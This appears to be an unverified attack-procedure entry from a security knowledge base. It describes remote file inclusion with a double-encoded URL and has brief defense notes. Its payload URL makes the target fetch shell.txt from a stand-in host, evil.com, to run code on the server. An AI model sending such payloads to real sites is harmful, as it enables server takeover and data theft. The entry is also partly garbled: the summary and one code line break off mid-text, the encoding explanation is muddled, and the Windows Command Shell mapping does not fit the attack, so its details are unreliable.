---
id: 586c25e6-b3d1-418f-bdab-d0293a685f17
name: Basic RFI with Double Encoding
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:58.220940+00:00'
updated_at: '2023-04-10T20:22:17.664614+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
sub_techniques:
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[Basic RFI]]'
- '[[Double encoding]]'
- '[[File Inclusion]]'
commands:
- '[[URL accessed]]'
---

# Basic RFI with Double Encoding

## Summary

This procedure involves exploiting a web application that is vulnerable to remote file inclusion (RFI) attacks. The attacker sends a request to the web server with a specially crafted URL that contains a path to a file on a remote server that the attacker controls. The attacker then encodes the URL

## Description

# Description

This procedure involves exploiting a web application that is vulnerable to remote file inclusion (RFI) attacks. The attacker sends a request to the web server with a specially crafted URL that contains a path to a file on a remote server that the attacker controls. The attacker then encodes the URL twice to bypass certain security measures. Once the web server processes the request, it includes the contents of the remote file in the web page response, giving the attacker the ability to execute arbitrary code on the server.

From a technical standpoint, the attacker is taking advantage of a vulnerability in the web application's input validation process. By manipulating the URL parameter, the attacker is able to bypass the application's security controls and inject malicious code into the web page response. This type of attack can be automated and scaled, allowing the attacker to compromise multiple servers in a short amount of time.

From a business perspective, this attack can result in the theft of sensitive information, the disruption of business operations, and damage to the organization's reputation.

## Requirements

1. Access to the vulnerable web application

1. Knowledge of the web application's URL parameters

1. Ability to encode URLs twice

## Defense

1. Implement input validation on all user-supplied data to prevent RFI attacks

1. Use a web application firewall (WAF) to block requests that contain encoded characters

1. Monitor web server logs for suspicious activity, such as requests for files that do not exist on the server

## Objectives

1. Exploit a web application that is vulnerable to RFI attacks

1. Execute arbitrary code on the web server

1. Gain access to sensitive information on the server

# Instructions

1. To execute this attack, the attacker sends a specially crafted URL to the vulnerable web application. The URL should contain a path to a file on a remote server that the attacker controls. The attacker then encodes the URL twice to bypass certain security measures. Once the web server processes the request, it includes the contents of the remote file in the web page response, giving the attacker the ability to execute arbitrary code on the server.

**Code**: [[http://example.com/index.php?page=http:%252f%252fe]]

> The 'page' parameter in the URL is vulnerable to RFI attacks. By including a path to a file on a remote server that the attacker controls, the attacker can execute arbitrary code on the web server. The attacker encodes the URL twice to bypass certain security measures. The first encoding replaces the forward slashes with '%252f', and the second encoding replaces the '%' with '%25'. This allows the URL to bypass certain security measures that look for encoded characters.

**Command** ([[URL accessed]]):

```bash
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

### Sub-Techniques

- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Commands Used

- [[URL accessed]]

## Tags

- [[Basic RFI]]
- [[Double encoding]]
- [[File Inclusion]]
